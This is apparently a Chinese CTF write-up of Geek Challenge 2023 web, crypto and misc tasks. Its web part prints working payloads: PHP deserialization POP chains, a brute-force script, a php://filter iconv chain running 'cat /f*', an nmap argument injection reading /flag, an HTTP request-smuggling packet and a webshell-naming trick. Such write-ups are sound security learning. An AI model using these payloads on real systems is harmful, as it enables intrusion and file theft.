由于有waf的存在，肯定是过不了的，不过可以使用unicode编码绕过。（unicode编码就是字符转为16进制然后添加前缀\\u00即可

![](./images/1700464104-image.png)

然后进入flag页面，需要传一个参数num进行比较，通过源码可知num的条件

其实只需要让num等于123456789后加一个空格，即可绕过，因为int函数会自动去除空格

![](./images/1700464315-image.png)

### klf\_3

这道题的话，嗯。。。可以直接用klf\_2的payload打，没有一点障碍

可能是因为我打2的时候想得太多了，多绕了几下，本来2可能没有那么难，这道题直接照着上面的打就行了。。。

### Akane!

源码如下👇

```
<?php
error_reporting(0);
show_source(__FILE__);
class Hoshino
{
    public $Ruby;
    private $Aquamarine;

    public function __destruct()
    {
        $this->Ruby->func();
    }
}

class Idol
{
    public $Akane;

    public function __wakeup()
    {
        $this->Akane = '/var/www/html/The************************.php';
    }

    public function __call($method,$args)
    {
        $Kana = count(scandir($this->Akane));
        if ($Kana > 0) {
            die('Kurokawa Akane');
        } else {
            die('Arima Kana');
        }
    }
}

$a = unserialize(base64_decode($_GET['tuizi']));

?>
```

有一道贵阳大数据CTF的题目和这个比较相似

- [贵阳大数据及网络安全精英对抗赛-解题赛 WP - Yulate's Blog](https://www.yulate.com/380.html)

- [2023 贵阳大数据 CTF 部分题解 | 南溟NaN (southsea.st)](https://southsea.st/2023-GYBD/#hackerconfused)

利用点就是scandir这个函数，已知scandir使用的时候不管有没有东西，都会返回一个数组里面包含一两个点，如果使用glob://协议的话，就不会包含点，结合count函数会计入点的特性，用glob协议来对php文件名进行爆破

![](./images/1700487965-image.png)

我的py脚本👇

```
import string
import requests
import base64
dic=string.printable
url='https://ssi28gtqfby8kz2u0e7bz3vej.node.game.sycsec.com/?tuizi='
table = ''
#记住要绕过wakeup函数，防止他重置目录，只需要把Idol的参数+1即可
for i in range(23,-1,-1):
    for j in dic:
        original_string = 'O:7:"Hoshino":2:{s:4:"Ruby";O:4:"Idol":2:{s:5:"Akane";s:52:"glob:///var/www/html/The'+table+j+'*'*i+'.php";}s:19:" Hoshino Aquamarine";N;}'
# 进行加密
        encoded_bytes = base64.b64encode(original_string.encode('utf-8'))
        payload= encoded_bytes.decode('utf-8')
        r=requests.get(url+payload)
        if 'Kurokawa Akane' in r.text:
            print(r.text,original_string,table)
            print()
            table+=j
            break
```

### ez\_php

传入部分源码👇

```
if (isset($_GET['user'])) {
    $user = $_GET['user'];
    if (!preg_match("/^[Oa]:[\d]+/i", $user)) {
        unserialize($user);
    }
    else {
        echo("不是吧，第一层都绕不过去？？？<br>");
    }
}
else {
    echo("快帮我找找她！<br>");
}
```

在CTFshow上有一道类似的题目：[愚人杯3rd \[easy\_php\] (yuque.com)](https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#)，可以参考绕过Oa:\\d的正则，使用C属性

要先进入useless类的destruct魔术方法里找到key

```
$bool=!is_array($this->QW)&&!is_array($this->YXX)&&(md5($this->QW) === md5($this->YXX)) && ($this->QW != $this->YXX) and $random==='newbee';#这个newbee不用管他，对判断语句是没有影响的
```

对于这段判断条件来说，MD5强比较由于前面限制不能为数组，就不能用数组来绕过，同时由于是GET方式传参，在网上能够搜到一些CTF的MD5强碰撞往往是以一些不可见字符组成的字符串，会被url解码从而导致比较失失败，这里偶然间看到一个MD5合集，又学到一个新姿势：[php-md5类型题目汇总 | dota\_st (wlhhlc.top)](https://www.wlhhlc.top/posts/16813/#pass8)

```
var_dump(md5('INF')===md5(INF));
#bool(true) 很巧妙的方式，INF是无限大
```

```
<?php
class useless {
    private $seeyou;
    public $QW='INF';
    public $YXX=INF;

}

$a=new useless();
$b=new ArrayIterator(array($a));
$a=serialize($b);
echo $a;
#C:13:"ArrayIterator":103:{x:i:0;a:1:{i:0;O:7:"useless":3:{s:15:"%00useless%00seeyou";N;s:2:"QW";s:3:"INF";s:3:"YXX";d:INF;}};m:a:0:{}}即可绕过第一层
```

进入第二层：

![](./images/1700706292-image.png)

这个关键点不在于basename这个函数，虽然basename也有相关的漏洞，这里考察的是server这个全局变量数组

![](./images/1700706377-image.png)

于是如下图构造url，即可在网页源码里看到php代码

![](./images/1700706425-image.png)

但是全是base64加密后的代码，而且很长，一般来说就是一个图片

![](./images/1700706474-image.png)

将其全部值复制下来，去掉首尾的注释符号（/\*、\*/）

![](./images/1700706522-image.png)

![](./images/1700706535-image.png)

运行一下，即可得到一个图片👇密码就是：9，名字叫：momo

![](./images/1700706562-image.png)

至此useless类的destruct利用完毕，准备进入Me类的wakeup

![](./images/1700706725-image.png)

这个随机字符串的绕过，用**_地址引用_**即可，然后跳到her类的invoke，再经过serialize跳到sleep方法，再跳到useless的get方法，最后回到her的find函数完毕

![](./images/1700709872-image.png)

值得注意的是important类里sleep执行后引发的useless类的get方法

这里的`**$zhui[$good]();**` 就等同与**`$this->seeyou`\[`$this->seeyou`\]();**

这里我问了问万能的GPT👇

![](./images/1700710018-image.png)

所以说POP链就是：Me->wakeup 👉 her->invoke 👉 important->sleep 👉useless->get 👉 her->find

poc👇

```
<?php
class Me {
    public $qwe;
    public $bro;
    public $secret;

}

class her{
    public $hername='momo';
    public $key=9;
    public $asd;
    public function find() {}
}
class important{
    public $power;

}
class useless
{
    public $seeyou;
    public $QW;
    public $YXX;
}

$me=new Me();
$her=new her();
$important=new important();
$useless=new useless();
$me->bro=&$me->secret;
$me->qwe=$her;
$her->asd=$important;
$important->power=$useless;
$useless->seeyou['seeyou']=[$her, 'find'];
echo serialize( new ArrayIterator(array($me)));
#C:13:"ArrayIterator":275:{x:i:0;a:1:{i:0;O:2:"Me":3:{s:3:"qwe";O:3:"her":3:{s:7:"hername";s:4:"momo";s:3:"key";i:9;s:3:"asd";O:9:"important":1:{s:5:"power";O:7:"useless":3:{s:6:"seeyou";a:1:{s:6:"seeyou";a:2:{i:0;r:5;i:1;s:4:"find";}}s:2:"QW";N;s:3:"YXX";N;}}}s:3:"bro";N;s:6:"secret";R:16;}};m:a:0:{}}
```

这里忘了说了，题目环境是7.4，PHP版本大于7就对private和public不敏感了，上面没改将就看吧

进入find函数看看

![](./images/1700710302-image.png)

file一眼看就是data伪协议绕过

那么注意一下ctf和fun，前面有一个new，就不能直接命令执行，这里涉及到PHP原生类读取文件

[【精选】浅谈 php原生类的利用 1(文件操作类)\_filesystemiterator-CSDN博客](https://blog.csdn.net/weixin_63231007/article/details/124740776)

最后的payload👇

![](./images/1700710391-image.png)

在这个PHP文件里拿到flag

![](./images/1700710436-image.png)

### change\_it

这道题对上传身份有限制

![](./images/1700898067-image.png)

解密后是这样的

![](./images/1700898100-image.png)

找了很久也没找到key的线索，于是干脆就爆破吧🤭

附上工具连接：[GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)

下到虚拟机里面去

可能遇到的问题，参考👉：[快速安装 c-jwt-cracker - litluo - 博客园 (cnblogs.com)](https://www.cnblogs.com/litluo/p/c-jwt-cracker.html)

![](./images/1700898193-image.png)

爆破得出key是yibao，直接在jwt.io这个网站里去修改即可，如图修改后即可

![](./images/1700898241-image.png)

看到此时的状态已经是allow，第一层绕过

![](./images/1700898267-image.png)

源码中有提示

```
<!-- 一直连不上？连不上就对啦！ -->
  <!-- 
    php版本为8.0
  function php_mt_seed($seed)
        {
            mt_srand($seed);
        }
        $seed = time();
        php_mt_seed($seed);
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

        $newFileName = '';
        for ($i = 0; $i < 10; $i++) {
            $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];
        }
  
  -->
```

可以看到文件名称是随机的，但是这种播种子的方式是伪随机的，种子一样，那么出来的随机数序列也是一样，可以在本地测试一下时间，大概推算一下上传时间，然后生成随机名称在连接木马

![](./images/1700898546-image.png)

然后像这样估摸着大概时间，一个一个的尝试

![](./images/1700899704-image.png)

然后拿到flag

![](./images/1700899849-image.png)

### ezrfi

![](./images/1701177601-image.png)

传参如图，拿到hint源码

![](./images/1701177643-image.png)

解码得到尊嘟假嘟密码（这个在MoeCTF的crypto部分看到过，拿去解密

[尊嘟假嘟O.o (zdjd.asia)](https://www.zdjd.asia/)

![](./images/1701177837-image.png)

题目给的提示是：RC4解密，猜测密码为Syclover，拿到hex源码

```
文件包含逻辑是include($file.".py"),你能找到flag文件位置吗??
```

如下传参

```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-
1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver
t.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co
nvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-
16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-
decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co
nvert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-
16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|conver
t.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-
16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-
decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co
nvert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-
16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-
decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR
|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-
932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-
decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-
16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-
932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-
decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-
decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-
decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-
156.JOHAB|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver
t.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co
nvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-
encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-
932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-
decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-
decode/resource=php://temp&0=cat%20/f*
#此步来源于https://www.cnblogs.com/mumuhhh/articles/17860683.html
```

### scan\_tool

nmap这个工具在网鼎杯里出现过

[BUUCTF \[网鼎杯 2020 朱雀组\] Nmap\_\[网鼎杯 2020 朱雀组\]nmap-CSDN博客](https://blog.csdn.net/weixin_44037296/article/details/110893526)

不过这里过滤的更严格，无法直接写入php一句话木马

```
传入参数：' --excludefile /flag -oA aaa '
```

![](./images/1701178923-image.png)

然后访问aaa.nmap，即可得到flag

### EZ\_Smuggling

题目是与http走私有关的，不会写，参考[极客大挑战2023 Web方向题解wp 全-CSDN博客](https://blog.csdn.net/Jayjay___/article/details/134675568?spm=1001.2014.3001.5501)Jay17大佬的wp复现

![](./images/1701179236-image.png)

只有admin有权限访问

burp的repeater设置如下

![](./images/1701179283-image.png)

然后构造如下包

```
POST / HTTP/2
Host: 47.108.56.168:20231
Cookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://47.108.56.168:20231
Referer: https://47.108.56.168:20231/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers

GET /admin HTTP/1.1
Host: 47.108.56.168:20231
Cookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=
Content-Length: 1

x=1
```

## Crypto

### SignIn

信息如下

```
Bibo...Hello! 你好! こんにちは! Привет! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d…  Hmm... Something goes wrong with my grettings bot.
```

十六进制转换字符串得到flag

### proof\_of\_work

题目要求nc

![](./images/1699066071-image.png)

这就要写脚本来爆破了，题目是动态的

```
import hashlib
import itertools
from string import digits, ascii_letters, punctuation

alpha_bet = digits + ascii_letters + punctuation
strlist = itertools.product(alpha_bet, repeat=4)

sha256 = "c400239e68f0b952313b370b4f6430fa80d006f4b8bf9949e9e3e211b1f3df88"
tail = "wFk2UJk5eKncaTiz"

xxxx = ''

for i in strlist:
    data = i[0] + i[1] + i[2] + i[3]
    data_sha = hashlib.sha256((data + tail).encode('utf-8')).hexdigest()
    if data_sha == sha256:
        xxxx = data
        break

print(xxxx)
```

![](./images/1699067882-image.png)

### OldAlgorithm

**An old algorithm but widely used nowadays.**

```
from Crypto.Util.number import * 
import os 
flag = b"SYC{Al3XEI_FAKE_FLAG}"

pad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))

flag = pad(flag,32)
print(len(flag))
p = [getPrime(16) for _ in range(32)] 
c = [bytes_to_long(flag)%i for i in p] 

print('p=',p)
print('c=',c)

'''
p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]
c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]
'''
```

脚本如下👇

```
from Crypto.Util.number import *
import os
from sympy.ntheory.modular import crt

flag = b"SYC{Al3XEI_FAKE_FLAG}"
pad = lambda msg, padlen: msg+os.urandom(padlen-len(msg))
flag = pad(flag, 32)

# 根据原始代码生成的质数列表和余数列表
p = [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]
c = [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]

# 使用 crt 函数解密得到原始消息
x = crt(p, c, check=False)
msg = long_to_bytes(x[0] % x[1])

print(msg)
```

## MISC

### cheekin

**请前往"三叶草小组Syclover"微信公众号输入flag获得flag**

![](./images/1699075245-image.png)

RGB图片隐写

### ez\_smilemo

**游戏通关即可得到flag内容，需要自行添加\`SYC{}\`包含。例: flag内容为 haha\_haha 则最终flag为 SYC{haha\_haha} 题目链接：https://pan.baidu.com/s/1Vfklz0\_isBoHNylRv8um8w?pwd=geek hint: data.win**

游戏这里就不玩了，直接去分析data.win吧，进去下面的连接，分析win

[如何在没有 Visual FoxPro 的情况下打开 WIN 文件 (filext.com)](https://filext.com/zh/wenjian-kuozhan-ming/WIN#:~:text=%E5%B0%86%20WIN%20%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8E%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9B%B8%E5%85%B3%E8%81%94%E3%80%82%20%E5%9C%A8%20%E4%B8%8A%EF%BC%8C%E5%8F%B3%E9%94%AE%E5%8D%95%E5%87%BB%E4%BB%BB%E4%BD%95,WIN%20%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8D%95%E5%87%BB%E2%80%9C%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F%E2%80%9D%E2%86%92%E2%80%9C%E9%80%89%E6%8B%A9%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E2%80%9D%E3%80%82%20%E7%8E%B0%E5%9C%A8%E9%80%89%E6%8B%A9%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%B9%B6%E9%80%89%E4%B8%AD%E2%80%9C%E5%A7%8B%E7%BB%88%E4%BD%BF%E7%94%A8%E6%AD%A4%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%89%93%E5%BC%80%20%2A.win%20%E6%96%87%E4%BB%B6%E2%80%9D%E6%A1%86%E3%80%82)

![](./images/1699075514-image.png)

base64解码即可

### DEATH\_N0TE

"o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索..."。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。 hint1: Stegsolve lsb hint2: 图片大小和像素点

![](./images/1699075565-image.png)

![](./images/1699075635-image.png)

![](./images/1699075705-image.png)

找到一半flag，将图片放大看，能看到一些像素点，但是不清晰

![](./images/1699075737-image.png)

利用python脚本缩小一下

```
from PIL import Image

img = Image.open('kamisama.png')
w = img.width
h = img.height
img_obj = Image.new("RGB",(w//5,h//5))

for x in range(w//5):
    for y in range(h//5):
        pixel = img.getpixel((x*5,y*5))
        if len(pixel) == 3:
            (r, g, b) = pixel
            img_obj.putpixel((x, y), (r, g, b))
        elif len(pixel) == 4:
            (r, g, b, _) = pixel
            img_obj.putpixel((x, y), (r, g, b))

img_obj.save('123.png')
```

![](./images/1699075903-image.png)

得到一些奇怪的文字，搜索一下死亡笔记字体

![](./images/1699075982-image.png)

### 下一站是哪儿呢

**我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？   flag格式：SYC{航班号\_城市拼音}，城市拼音首字母大写噢**

![](./images/1699076073-image.png)

百度识图一下

![](./images/1699076107-image.png)

得知出发地是深圳宝安，用010editor看看猪猪侠的图片

在中部发现有东西

![](./images/1699076157-image.png)

放进kali虚拟机里binwalk分离一下

![](./images/1699076347-image.png)

![](./images/1699076435-image.png)

有一个secret.png和一个txt

![](./images/1699076453-image.png)

![](./images/1699076475-image.png)

一段看不懂的文字，但是根据提示，应该是指挥官基恩中的文字，搜索一下

![](./images/1699076520-image.png)

翻译过来是 I WANT TO GO TO LIQUOR CITY（我想去酒城）

酒城是泸州的别称，根据聊天图，只需要查找8月25日从深圳宝安到泸州的航班就行了

用这个网站：[航线图-Variflight航线图](https://map.variflight.com/)注册一下就行了

![](./images/1699076859-image.png)

根据时间可知，航班号为CZ8579

### Qingwan心都要碎了

**Qingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？  flag格式：SYC{地点名字}**

![](./images/1699076933-image.png)

磁器口是在重庆，先缩小范围

![](./images/1699077189-image.png)

发现三峡两个字，那就用重庆+三峡+博物馆作为关键字搜索一下

得出重庆中国三峡博物馆

### xqr

**Qrcode can deliver binary msg**

题目给了一个二维码，扫了是fakeflag

拿进010editor看看

![](./images/1699077307-image.png)

发现还隐藏了另外一张图片

直接复制89 50 4E 47后面的全部内容，在010上面新建另一个png，用ctrl+shift+v粘贴，然后得到图片

但是其他大小只有25\*25，而附件图片有75\*75，打开画图

![](./images/1699077736-image.png)

修改后保存，打开stegsolve，选image combiner

![](./images/1699077794-image.png)

XOR后得到一张图，定位点都是有的，不过还是扫不出来的，将其保存下来

![](./images/1699077821-image.png)

选择反色

![](./images/1699077901-image.png)

得到的这个二维码就能扫了

![](./images/1699077914-image.png)
